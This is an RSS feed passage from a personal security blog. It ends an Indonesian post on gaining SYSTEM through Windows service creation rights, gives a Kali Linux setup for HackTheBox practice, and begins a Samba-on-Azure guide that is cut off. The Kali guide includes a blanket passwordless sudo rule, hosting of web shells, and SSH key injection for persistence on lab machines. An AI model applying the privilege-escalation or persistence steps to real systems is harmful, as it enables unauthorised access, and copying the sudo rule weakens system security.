</span><span class="c1"></span>	<span class="k">if</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">StartService</span><span class="p">(</span><span class="nx">svcHandle</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="kc">nil</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Print</span><span class="p">(</span><span class="s">&#34;Error Starting service&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
		<span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
	<span class="p">}</span>
    <span class="c1">// Creation of a Service: STEP 4
</span><span class="c1"></span>    <span class="c1">// Finally close the handles
</span><span class="c1"></span>    <span class="nx">windows</span><span class="p">.</span><span class="nf">CloseServiceHandle</span><span class="p">(</span><span class="nx">svcHandle</span><span class="p">)</span>
    <span class="nx">windows</span><span class="p">.</span><span class="nf">CloseHandle</span><span class="p">(</span><span class="nx">scmHandle</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div><p>VbScrub sendiri sebelumnya telah menuliskan kode untuk mendemonstrasikan hal ini, bisa dilihat <a href="https://github.com/VbScrub/ServiceInstallerTest">disini</a>.</p>
<p><em>Hasilnya</em>?</p>
<p>SYSTEM!*</p>
<p><div class="img-container"><img src="imgs/image-20210813011334034.png" alt="image-20210813011334034"  /></div>
</p>
<blockquote>
<p>*Perlu diingat user yang menjalankan program sudah perlu hak akses <code>SC_MANAGER_CREATE_SERVICE</code>.</p>
</blockquote>
<p><em>Tapi, kenapa harus custom code?</em></p>
<p>Karena <code>sc.exe</code> sendiri tidak menyediakan opsi untuk meng-assign <code>SERVICE_ALL_ACCESS</code> pada service yang akan dibuat. Ditambah, setelah proses pembuatan service, handle-handlenya ditutup.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc create
DESCRIPTION:
        Creates a service entry in the registry and Service Database.
USAGE:
        sc &lt;server&gt; create <span class="o">[</span>service name<span class="o">]</span> <span class="o">[</span><span class="nv">binPath</span><span class="o">=</span> <span class="o">]</span> &lt;option1&gt; &lt;option2&gt;...

OPTIONS:
NOTE: The option name includes the equal sign.
      A space is required between the equal sign and the value.
 <span class="nv">type</span><span class="o">=</span> &lt;own<span class="p">|</span>share<span class="p">|</span>interact<span class="p">|</span>kernel<span class="p">|</span>filesys<span class="p">|</span>rec<span class="p">|</span>userown<span class="p">|</span>usershare&gt;
       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> own<span class="o">)</span>
 <span class="nv">start</span><span class="o">=</span> &lt;boot<span class="p">|</span>system<span class="p">|</span>auto<span class="p">|</span>demand<span class="p">|</span>disabled<span class="p">|</span>delayed-auto&gt;
       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> demand<span class="o">)</span>
 <span class="nv">error</span><span class="o">=</span> &lt;normal<span class="p">|</span>severe<span class="p">|</span>critical<span class="p">|</span>ignore&gt;
       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> normal<span class="o">)</span>
 <span class="nv">binPath</span><span class="o">=</span> &lt;BinaryPathName to the .exe file&gt;
 <span class="nv">group</span><span class="o">=</span> &lt;LoadOrderGroup&gt;
 <span class="nv">tag</span><span class="o">=</span> &lt;yes<span class="p">|</span>no&gt;
 <span class="nv">depend</span><span class="o">=</span> &lt;Dependencies<span class="o">(</span>separated by / <span class="o">(</span>forward slash<span class="o">))</span>&gt;
 <span class="nv">obj</span><span class="o">=</span> &lt;AccountName<span class="p">|</span>ObjectName&gt;
       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> LocalSystem<span class="o">)</span>
 <span class="nv">DisplayName</span><span class="o">=</span> &lt;display name&gt;
 <span class="nv">password</span><span class="o">=</span> &lt;password&gt;
</code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>Disini kita tahu bahwa regular user dengan hak pembuatan service (<code>SC_MANAGER_CREATE_SERVICE</code>)  dapat membuat sebuah service tapi tidak memiliki kontrol langsung untuk menjalankan service tersebut. Namun, beda ceritanya jika handle yang didapatkan dari pembuatan sebuah service langsung digunakan untuk melakukan kontrol terhadap service yang dibuat.</p>
<p>Saya sendiri setuju dengan VbScrub bahwa ini kemungkinan bukan security issue. Karena kalau kita mengacu ke <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?">dokumentasi Microsoft</a>, bisa disimpulkan secara tidak langsung jika user yang mampu membuat service adalah termasuk admin.</p>
<p><div class="img-container"><img src="imgs/image-20210812194031337.png" alt="image-20210812194031337"  /></div>
</p>
<p>Untuk eksploitasi hak <code>SC_MANAGER_CREATE_SERVICE</code> tanpa custom compiled program kita bisa mengubah nilai &ldquo;start up type&rdquo; si service ke otomatis ketika booting dengan mensuplai <code>start=auto</code> di <code>sc.exe</code>.</p>
<p>Sekian~</p>
<section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>*Ngulik itu sebangsa ngoprek üòÖ&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</section>
]]></content:encoded>
    </item>
    
    <item>
      <title>Kali Linux Setup for Playing HTB</title>
      <link>https://fahmifj.github.io/blog/kali-setup-for-hackthebox/</link>
      <pubDate>Fri, 09 Jul 2021 07:45:19 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/kali-setup-for-hackthebox/</guid>
      <description>Noob Kali setup</description>
      <content:encoded><![CDATA[<p>After using Kali 2019.4 for almost 2 years, I finally upgraded my Kali to 2021.2. I wanted to try Parrot or build a <em>weaponized</em> version of Ubuntu, but because I like simplicity, I decided to use Kali again üòÑ <em>//slap</em>.</p>
<p>In this post, I‚Äôd like to share my Kali Linux setup for playing  HackTheBox. I think it is applicable for TryHackMe, VulnHub or other  boot2root platform, too.</p>
<h2 id="display-ip-address-in-prompt">Display IP Address in Prompt</h2>
<p>Adding IP address in your prompt would be really helpful as it lets you copy the IP faster for reverse shell. To do so, we&rsquo;ll need to modify the <code>.zshrc</code> file. But, before performing any modification, consider to make a backup of your original file using the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ cp ~/.zshrc<span class="o">{</span>,.bak<span class="o">}</span> 
</code></pre></div><p>Also, I usually put any customization at the top of the <code>.zshrc</code> file wrapped between two comments, for example:</p>
<pre tabindex="0"><code># START CUSTOM
...[custom script here]
# END CUSTOM
</code></pre><p>If all set, add the following function to your <code>.zshrc</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="k">function</span> get_ip<span class="o">(){</span>
   <span class="c1"># It can be thm or htb IP</span>
   <span class="nv">tunnel_ip</span><span class="o">=</span><span class="sb">`</span>ifconfig tun0 2&gt;/dev/null <span class="p">|</span> grep netmask <span class="p">|</span> awk <span class="s1">&#39;{print $2}&#39;</span><span class="sb">`</span> 
   <span class="c1"># Use eth0 as default IP,</span>
   <span class="nv">default_ip</span><span class="o">=</span><span class="sb">`</span>ifconfig eth0 2&gt;/dev/null <span class="p">|</span> grep netmask <span class="p">|</span> awk <span class="s1">&#39;{print $2}&#39;</span><span class="sb">`</span>
   <span class="k">if</span> <span class="o">[[</span> <span class="nv">$tunnel_ip</span> <span class="o">==</span> *<span class="s2">&#34;10.&#34;</span>* <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
      <span class="nb">echo</span> <span class="nv">$tunnel_ip</span>
   <span class="k">else</span>
      <span class="nb">echo</span> <span class="nv">$default_ip</span>
   <span class="k">fi</span>
<span class="o">}</span>
</code></pre></div><p>Then, find the following lines:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">...
<span class="k">case</span> <span class="s2">&#34;</span><span class="nv">$PROMPT_ALTERNATIVE</span><span class="s2">&#34;</span> in
        twoline<span class="o">)</span>
...
</code></pre></div><p>Under these lines,  replace the entire <code>PROMPT</code> variable with the following line:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">PROMPT=$&#39;%F{%(#.blue.green)}‚îå‚îÄ‚îÄ${debian_chroot:+($debian_chroot)‚îÄ}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))‚îÄ}(%B%F{%(#.red.blue)}%n$prompt_symbol%m%b%F{%(#.blue.green)})-[%B%F{reset}%(6~.%-1~/‚Ä¶/%4~.%5~)%b%F{%(#.blue.green)}]-%B%F{152}[`get_ip`]%b%f%F{%(#.blue.green)}\n‚îî‚îÄ%B%(#.%F{red}#.%F{blue}$)%b%F{reset} &#39;
</code></pre></div><p>Reopen your terminal or type one of the following commands in the terminal.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ zsh
$ <span class="nb">source</span> ~/.zshrc
</code></pre></div><p>And done.</p>
<p><div class="img-container"><img src="imgs/image-20210709054914243.png" alt="image-20210709054914243"  /></div>
</p>
<h2 id="openvpn-connection">OpenVPN Connection</h2>
<p>For VPN, it&rsquo;s tiring when you have to type <code>$ openvpn /path/to/config/file.ovpn</code> each time you want to connect to the HTB/THM network. To make thing easier, we can create a folder called <code>.ovpnconfig</code> in the home directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ mkdir -p ~/.ovpnconfig
</code></pre></div><p>Then put all of your OpenVPN configuration files into this <code>.ovpnconfig</code> folder.</p>
<p><div class="img-container"><img src="imgs/image-20210709063528132.png" alt="image-20210709063528132"  /></div>
</p>
<p>Finally, add some aliases into your <code>.zshrc</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">alias</span> <span class="nv">htbon</span><span class="o">=</span><span class="s1">&#39;openvpn ~/ovpnconfig/htb-sg.ovpn 1&gt;/dev/null &amp;&#39;</span>
<span class="nb">alias</span> <span class="nv">htbfort</span><span class="o">=</span><span class="s1">&#39;openvpn ~/ovpnconfig/htb-fortress.ovpn 1&gt;/dev/null &amp;&#39;</span>
<span class="nb">alias</span> <span class="nv">htbrel</span><span class="o">=</span><span class="s1">&#39;openvpn ~/ovpnconfig/htb-release.ovpn 1&gt;/dev/null &amp;&#39;</span>
<span class="nb">alias</span> <span class="nv">thmon</span><span class="o">=</span><span class="s1">&#39;openvpn ~/ovpnconfig/thm.ovpn 1&gt;/dev/null &amp;&#39;</span>
<span class="nb">alias</span> <span class="nv">thmwreath</span><span class="o">=</span><span class="s1">&#39;openvpn ~/ovpnconfig/thm-wreath.ovpn 1&gt;/dev/null &amp;&#39;</span>
<span class="nb">alias</span> <span class="nv">kvpn</span><span class="o">=</span><span class="s1">&#39;pkill openvpn&#39;</span>
</code></pre></div><p>Now we can type <code>$ htbon</code> or <code>$ thmon</code> in the command prompt to connect to the VPN.  Want to turn off the VPN? Simply type <code>$ kvpn</code> !</p>
<h2 id="sudo-with-alias">Sudo with Alias</h2>
<p>In the newer Kali Linux (non-root login), the only problem is that <code>openvpn</code> must be executed with <code>sudo</code> . Therefore, you&rsquo;ve to add the following <code>sudo</code> alias.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"># Source: https://askubuntu.com/questions/750419/how-do-i-run-a-sudo-command-needing-password-input-in-the-background
alias sudo=&#39;sudo -v; [ $? ] &amp;&amp; sudo &#39;
</code></pre></div><ul>
<li><code>sudo -v</code> will authenticate the user first.</li>
<li><code>[ $? ] &amp;&amp; sudo </code> will check if the previous command (separated by semi-colon) return with success (value of 0), if yes run <code>sudo</code> again.</li>
</ul>
<p>This time, we can run sudo command with aliases.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ sudo &lt;alias-command&gt;
$ sudo htbon
$ sudo thmon
$ sudo kvpn
</code></pre></div><p>An alternative for sudo to work with alias is using sudo with no passwd.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ sudo visudo /etc/sudoers.d/kali
</code></pre></div><p>Then add the following line.</p>
<pre tabindex="0"><code>kali  ALL=NOPASSWD: ALL
</code></pre><p>After that, change the previous sudo alias to this one</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">alias sudo=&#39;sudo &#39;
</code></pre></div><h2 id="tools-transfer">Tools Transfer</h2>
<p>Just like the OpenVPN files, I like to keep the essential tools to be centralized in one folder and so it can be hosted immediately. Again, we can create a folder called <code>tools</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ mkdir -p ~/tools
</code></pre></div><p>Put your tools inside the folder. The following are some of the tools that I think to be essential (including web-shell).</p>
<p><div class="img-container"><img src="imgs/image-20210709065944915.png" alt="image-20210709065944915"  /></div>
</p>
<p>Next, add another alias to host these tools immediately with one command, feel free to create alias for yourself. Mine called <code>hostit</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">alias</span> <span class="nv">hostit</span><span class="o">=</span><span class="s1">&#39;python3 -m http.server -d ~/tools 8000&#39;</span>
</code></pre></div><p>If you watch <a href="https://www.youtube.com/c/ippsec/videos">ippsec</a>, he prefers keeping the tools with the associated pwned machines (in <code>www</code> directory). So it&rsquo;s up to you.</p>
<h2 id="note-template">Note Template</h2>
<p>My current note template is available on <a href="https://github.com/fahmifj/HackTheBox-notes/tree/main/machines/note-template">GitHub</a>. I&rsquo;m using the following function to recreate the directory structure:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="k">function</span> mknote<span class="o">(){</span>
  mkdir nmap gobuster loot logs exploits ssh-keys post-exploits
<span class="o">}</span>
</code></pre></div><ul>
<li>
<p><strong>nmap:</strong> each nmap scan goes here.</p>
</li>
<li>
<p><strong>gobuster:</strong> each gobuster scan goes here.</p>
</li>
<li>
<p><strong>loot:</strong> each interesting file for further analysis goes here.</p>
</li>
<li>
<p><strong>logs:</strong> If you like to log your activity with <code>$ script</code> , put them here.</p>
</li>
<li>
<p><strong>exploits:</strong> exploit script goes here.</p>
</li>
<li>
<p><strong>ssh-keys:</strong> obtained ssh-key goes here, not loot.</p>
</li>
<li>
<p><strong>post-exploits:</strong> post-compromise loot goes here.</p>
</li>
</ul>
<p>Usage is simple:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ <span class="nb">cd</span> htb-machine-folder/
$ mknote
$ tree
.
‚îú‚îÄ‚îÄ exploits
‚îú‚îÄ‚îÄ gobuster
‚îú‚îÄ‚îÄ logs
‚îú‚îÄ‚îÄ loot
‚îú‚îÄ‚îÄ nmap
‚îú‚îÄ‚îÄ post-exploits
‚îî‚îÄ‚îÄ ssh-keys
</code></pre></div><h2 id="ssh-configuration">SSH Configuration</h2>
<p>I have always use a separate SSH keys for CTF. My SSH key for CTF is using ed25519. You can create one using the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ssh-keygen -a <span class="m">100</span> -t ed25519 -f ~/.ssh/ctf_ssh
</code></pre></div><p>After that, register your private key to SSH agent.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ <span class="nb">eval</span> <span class="s2">&#34;</span><span class="k">$(</span>ssh-agent -s<span class="k">)</span><span class="s2">&#34;</span>
$ ssh-add ~/.ssh/ctf_ssh
</code></pre></div><p>Since HackTheBox machine starts with IP address of <code>10.10.*</code>, add these lines to your SSH config (<code>~/.ssh/config</code>). Create one if you don&rsquo;t have it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">Host 10.10.*
  IdentityFile ~/.ssh/ctf_ssh
</code></pre></div><p>With the config above, whenever I injected my public key (<code>/.ssh/ctf_ssh.pub</code>) to HackTheBox machine for <a href="https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/">persistence access</a>, I can login by simply typing <code>$ ssh machine-name@hostname</code> or <code>$ ssh machine-name@ip</code>. I don&rsquo;t have to specify <code>-i /path/to/ssh/private/key</code> anymore.</p>
<h2 id="qterminal-configuration">QTerminal Configuration</h2>
<p>Unfortunately I&rsquo;m not a tmux user here. Tmux is rich in features, but I&rsquo;m not comfortable with its prefix key. So far, I&rsquo;ve always used the default QTerminal application and leveraged its shortcut feature to &lsquo;navigate&rsquo; a slightly faster in terminal.</p>
<p>If you&rsquo;re a Windows Terminal user, you&rsquo;ll familiar with some of these shortcuts:</p>
<ul>
<li><strong><code>ALT + Arrows</code></strong>: Move cursor in subterminal</li>
<li><strong><code>CTRL + TAB</code></strong>: Navigate between tabs</li>
<li><strong><code>CTRL + Arrow Left</code></strong>:  Previous tab</li>
<li><strong><code>CTRL + Arrow Right</code></strong>: Next tab</li>
<li><strong><code>CTRL + N</code></strong> : New terminal tab</li>
<li><strong><code>CTRL + SHIFT + W</code></strong> : Close current subterminal</li>
<li><strong><code>CTRL + SHIFT + =</code></strong> : Split terminal vertically</li>
<li><strong><code>CTRL + SHIFT + -</code></strong> : Split terminal horizontally</li>
<li><strong><code>CTRL + SHIFT + F</code></strong> : Open search bar in terminal</li>
<li><strong><code>CTRL + =</code></strong> : Zoom in</li>
<li><strong><code>CTRL + -</code></strong> : Zoom out</li>
</ul>
<p>For me, the only limitation here is that there is no shortcut for resizing a subterminal.</p>
<h2 id="all-in-one-with-oh-my-zsh-plugin">All in One with Oh My Zsh Plugin</h2>
<p>If you&rsquo;re a <a href="https://ohmyz.sh/#install">Oh My Zsh</a> user like me, we can add these configurations (excluding SSH and QTerminal configurations) into a custom plugin.</p>
<p>Save the following script to  <code>/home/&lt;username&gt;/.oh-my-zsh/custom/plugins/ctf/ctf.plugin.zsh</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
</span><span class="cp"></span>
<span class="k">function</span> get_ip<span class="o">(){</span>
   <span class="c1"># It can be thm or htb IP</span>
   <span class="nv">tunnel_ip</span><span class="o">=</span><span class="sb">`</span>ifconfig tun0 2&gt;/dev/null <span class="p">|</span> grep netmask <span class="p">|</span> awk <span class="s1">&#39;{print $2}&#39;</span><span class="sb">`</span> 
   <span class="c1"># Use eth0 as default IP,</span>
   <span class="nv">default_ip</span><span class="o">=</span><span class="sb">`</span>ifconfig eth0 2&gt;/dev/null <span class="p">|</span> grep netmask <span class="p">|</span> awk <span class="s1">&#39;{print $2}&#39;</span><span class="sb">`</span>
   <span class="k">if</span> <span class="o">[[</span> <span class="nv">$tunnel_ip</span> <span class="o">==</span> *<span class="s2">&#34;10.&#34;</span>* <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
      <span class="nb">echo</span> <span class="nv">$tunnel_ip</span>
   <span class="k">else</span>
      <span class="nb">echo</span> <span class="nv">$default_ip</span>
   <span class="k">fi</span>
<span class="o">}</span>

<span class="k">function</span> mknote<span class="o">(){</span>
  mkdir nmap gobuster loot logs exploits ssh-keys dump post-exploits
<span class="o">}</span>

<span class="c1"># https://askubuntu.com/questions/750419/how-do-i-run-a-sudo-command-needing-password-input-in-the-background</span>
<span class="nb">alias</span> <span class="nv">sudo</span><span class="o">=</span><span class="s1">&#39;sudo -v; [ $? ] &amp;&amp; sudo &#39;</span>
<span class="nb">alias</span> <span class="nv">htbon</span><span class="o">=</span><span class="s1">&#39;openvpn ~/ovpnconfig/htb-sg.ovpn 1&gt;/dev/null &amp;&#39;</span>
<span class="nb">alias</span> <span class="nv">htbfort</span><span class="o">=</span><span class="s1">&#39;openvpn ~/ovpnconfig/htb-fortress.ovpn 1&gt;/dev/null &amp;&#39;</span>
<span class="nb">alias</span> <span class="nv">htbrel</span><span class="o">=</span><span class="s1">&#39;openvpn ~/ovpnconfig/htb-release.ovpn 1&gt;/dev/null &amp;&#39;</span>
<span class="nb">alias</span> <span class="nv">thmon</span><span class="o">=</span><span class="s1">&#39;openvpn ~/ovpnconfig/thm.ovpn 1&gt;/dev/null &amp;&#39;</span>
<span class="nb">alias</span> <span class="nv">thmwreath</span><span class="o">=</span><span class="s1">&#39;openvpn ~/ovpnconfig/thm-wreath.ovpn 1&gt;/dev/null &amp;&#39;</span>
<span class="nb">alias</span> <span class="nv">kvpn</span><span class="o">=</span><span class="s1">&#39;pkill openvpn&#39;</span>
<span class="nb">alias</span> <span class="nv">hostit</span><span class="o">=</span><span class="s1">&#39;python3 -m http.server -d ~/tools 8000&#39;</span>
</code></pre></div><blockquote>
<p>If you want to include my note template as well, I&rsquo;ve prepared <a href="https://github.com/fahmifj/HackTheBox-notes/blob/main/machines/note-template/ctf.plugin.zsh">this one</a> with note template embedded in <code>mknote</code> function.</p>
</blockquote>
<p>The next step depends on your theme. I use a theme called <code>robbyrussell</code>.</p>
<p>I created a copy of the theme in <code> /home/kali/.oh-my-zsh/custom/themes/robbyrussell.zsh-theme</code> and modified the theme to display IP address and use two lines prompt.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">NEWLINE=$&#39;\n$&#39; 
PROMPT=&#39;%(?:%{$fg_bold[green]%}‚Üí:%{$fg_bold[red]%}‚Üí)&#39;
PROMPT+=&#39; %F{4}%n@%m %{$fg[cyan]%}¬´%c¬ª%{$reset_color%}&#39;
PROMPT+=&#39; %B%F{152}¬´$(get_ip)¬ª%f%b $(git_prompt_info)&#39;
PROMPT+=&#34;%F{31}${NEWLINE} %f&#34;

ZSH_THEME_GIT_PROMPT_PREFIX=&#34;%{$fg_bold[blue]%}git:(%{$fg[red]%}&#34;
ZSH_THEME_GIT_PROMPT_SUFFIX=&#34;%{$reset_color%} &#34;
ZSH_THEME_GIT_PROMPT_DIRTY=&#34;%{$fg[blue]%}) %{$fg[yellow]%}‚úó&#34;
ZSH_THEME_GIT_PROMPT_CLEAN=&#34;%{$fg[blue]%})&#34;
</code></pre></div><p>Finally, load the <code>ctf</code> plugin we created in <code>.zshrc</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">...[SNIP]...
# Which plugins would you like to load?
# Standard plugins can be found in $ZSH/plugins/
# Custom plugins may be added to $ZSH_CUSTOM/plugins/
# Example format: plugins=(rails git textmate ruby lighthouse)
# Add wisely, as too many plugins slow down shell startup.
plugins=(git ctf)

...[SNIP]...
</code></pre></div><p>Restart your terminal and we&rsquo;re done.</p>
<p><div class="img-container"><img src="imgs/image-20210711221808834.png" alt="image-20210711221808834"  /></div>
</p>
<p>And that&rsquo;s all for this post!</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Exposing a Samba Server to the Internet in Azure</title>
      <link>https://fahmifj.github.io/blog/setup-a-samba-server-in-azure/</link>
      <pubDate>Sun, 04 Jul 2021 19:45:21 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/setup-a-samba-server-in-azure/</guid>
      <description>And wait for bad things to happen</description>
      <content:encoded><![CDATA[<p>Last month, I was asked to setup a Samba/SMB server that is accessible over the Internet. Because it will only be used temporarily, I decided to use an Azure Virtual Machine (VM) instead of buying a dedicated VPS.</p>
<p>In the end the server was not used though, but I‚Äôll share my documentation about it.</p>
<p>Before proceeding further, I will  state that:</p>
<blockquote>
<p>Exposing an SMB Server directly to the Internet is not recommended, or not considered to be &lsquo;best practice&rsquo;. The safest way to make it accessible over the Internet is by setting up a VPN server and putting the SMB inside the VPN network.</p>
</blockquote>
<h4 id="goals-and-outcomes">Goals and Outcomes</h4>
<p>The goals here are exactly the same as what‚Äôs written in the title, but by the end of this post, you should be able to:</p>
<ul>
<li>Deploy an Ubuntu server in Azure</li>
<li>Setup and Configure a Samba server</li>
<li>Exposing Samba server over Internet (but don&rsquo;t)</li>
</ul>
<h4 id="prerequisites">Prerequisites</h4>
<p>The one and only prerequisite is:</p>
<ul>
<li>Azure Account</li>
</ul>
<p>Also, since this post won&rsquo;t be detailed step by step, I&rsquo;ll assume that you have:</p>
<ul>
<li>Basic knowledge of Azure, at least menu navigation and creating a resource group.</li>
<li>Basic knowledge of Linux</li>
</ul>
<p>Let&rsquo;s jump in!</p>
<h2 id="vm-configuration--deploy">VM Configuration &amp; Deploy</h2>
<p>At this step, I already have a resource group called <code>IAMF_SMB-TEST</code> and I&rsquo;ll be creating a VM instance inside this resource. It&rsquo;s a small server used by 4-5 users, so B1s will be enough. You&rsquo;re free to customize the VM.</p>
<p>The VM details of mine can be seen in the following image:</p>
<p><div class="img-container"><img src="imgs/image-20210513170545346.png" alt="image-20210513170545346"  /></div>
</p>
<p>For authentication to the server, I&rsquo;ll be using an SSH public key here instead of a password. The account for server administration is called <code>azure-smb</code>. Since the authentication is SSH, this VM will have an SSH port open publicly (internet).</p>
<p><div class="img-container"><img src="imgs/image-20210513170638603.png" alt="image-20210513170638603"  /></div>
</p>
<p>In the following section, I&rsquo;ll use a standard SSD and leave the other settings at their defaults.</p>
<p><div class="img-container"><img src="imgs/image-20210513170710958.png" alt="image-20210513170710958"  /></div>
</p>
<p>In the <strong>Networking</strong> section, I&rsquo;ll just create a new virtual network. See the following image for details:</p>
<p><div class="img-container"><img src="imgs/image-20210513170824172.png" alt="image-20210513170824172"  /></div>
</p>
<p>In the <strong>Management</strong> section, because it will be temporary, I&rsquo;ll just disable the boot diagnostics.</p>
<p><div class="img-container"><img src="imgs/image-20210513171009570.png" alt="image-20210513171009570"  /></div>
</p>
<p>I&rsquo;ll leave the <strong>Advanced</strong> with the default settings and skip the <strong>Tags</strong> section.</p>
<p>The last section is <strong>Review + Create</strong>, which basically reviews the VM configuration. After I finish the review, I&rsquo;ll press the <strong>Create</strong> button.</p>
<p><div class="img-container"><img src="imgs/image-20210513171153896.png" alt="image-20210513171153896"  /></div>
</p>
<p>When the <strong>Create</strong> button is clicked, the VM will be automatically deployed.</p>
<p><div class="img-container"><img src="imgs/image-20210513171501031.png" alt="image-20210513171501031"  /></div>
</p>
<h3 id="test-ssh-login">Test SSH Login</h3>
<p>The next step is to login to the deployed VM instance via SSH using the previously created username and key/password. The public IP of the VM instance can be found at the <code>Dashboard</code> &gt; <code>RESOURCE_GROUP_NAME</code> &gt; <code>PUBLIC_IP_NAME</code>. In my case, it is <code>Dashboard</code> &gt; <code>IAMF_SMB-TEST</code> &gt; <code>smb-server-ip</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ssh -i private_key azure-smb@PUBLIC_IP_ADDRESS
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210513171606268.png" alt="image-20210513171606268"  /></div>
</p>
<h2 id="samba-configuration">Samba Configuration</h2>
<h3 id="installation-and-initial-setup">Installation and Initial Setup</h3>
<p>First thing first, let&rsquo;s update the repository list.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo apt update
</code></pre></div><p>After that, install <code>Samba</code> with the following command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo apt install samba
</code></pre></div><p>Once the installation is done, check the Samba service daemon status.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo systemctl status smbd
‚óè smbd.service - Samba SMB Daemon
   Loaded: loaded <span class="o">(</span>/lib/systemd/system/smbd.service<span class="p">;</span> enabled<span class="p">;</span> vendor preset: enabled<span class="o">)</span>
   Active: active <span class="o">(</span>running<span class="o">)</span> since Thu 2021-05-13 10:17:45 UTC<span class="p">;</span> 3min 48s ago
     Docs: man:smbd<span class="o">(</span>8<span class="o">)</span>
           man:samba<span class="o">(</span>7<span class="o">)</span>
           man:smb.conf<span class="o">(</span>5<span class="o">)</span>
 Main PID: <span class="m">2098</span> <span class="o">(</span>smbd<span class="o">)</span>
   Status: <span class="s2">&#34;smbd: ready to serve connections...&#34;</span>
    Tasks: <span class="m">4</span> <span class="o">(</span>limit: 1056<span class="o">)</span>
   CGroup: /system.slice/smbd.service
           ‚îú‚îÄ2098 /usr/sbin/smbd --foreground --no-process-group
           ‚îú‚îÄ2123 /usr/sbin/smbd --foreground --no-process-group
           ‚îú‚îÄ2124 /usr/sbin/smbd --foreground --no-process-group
           ‚îî‚îÄ2129 /usr/sbin/smbd --foreground --no-process-group

May <span class="m">13</span> 10:17:44 smb-server systemd<span class="o">[</span>1<span class="o">]</span>: Starting Samba SMB Daemon...
May <span class="m">13</span> 10:17:45 smb-server systemd<span class="o">[</span>1<span class="o">]</span>: Started Samba SMB Daemon.
</code></pre></div><p>Samba is ready, and now let&rsquo;s configure the share folder.</p>
<h3 id="shares-configuration">Shares Configuration</h3>
<p>First, let&rsquo;s create a backup file of the original configuration, so we can reset it to the default configuration, just in case something goes wrong.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo cp /etc/samba/smb.conf<span class="o">{</span>,.backup<span class="o">}</span>
</code></pre></div><p>Now create a share folder name it <code>sambashare</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ mkdir sambashare
</code></pre></div><p>Then open the samba configuration file with a text editor like <code>nano</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo nano /etc/samba/smb.conf
</code></pre></div><p>Go straight to the bottom of the file and add the following lines.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>sambashare<span class="o">]</span>
